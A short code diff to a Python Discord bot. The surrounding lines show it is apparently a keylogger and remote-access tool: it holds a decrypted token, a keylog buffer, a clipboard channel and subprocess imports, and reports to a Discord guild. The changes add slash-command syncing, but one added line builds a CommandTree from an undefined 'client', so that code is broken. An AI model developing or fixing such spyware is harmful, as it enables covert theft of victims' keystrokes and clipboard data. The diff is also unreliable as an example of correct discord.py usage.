@@ -76,6 +76,7 @@ TOKEN = decrypted_data
 current_directory = os.getcwd()
 
 import discord
+import discord.ext
 from discord.ext import commands, tasks
 import platform
 import subprocess
@@ -144,6 +145,7 @@ intents.typing = True
 
 # Create the bot with intents
 bot = commands.Bot(command_prefix='>', intents=intents, help_command=None)
+slash = discord.app_commands.CommandTree(client)
 
 # Buffer to store keylog data
 keylog_buffer = []
@@ -176,6 +178,12 @@ async def on_ready():
     global clipboard_channel
 
     print(f'We have logged in as {bot.user}')
+    try:
+        synced = await bot.tree.sync()
+        print(f"Synced {len(synced)} command(s)")
+    except Exception as e:
+        print(e)
+
     if not notification_sent:
         guild = bot.guilds[0]  # Get the first guild the bot is connected to
 
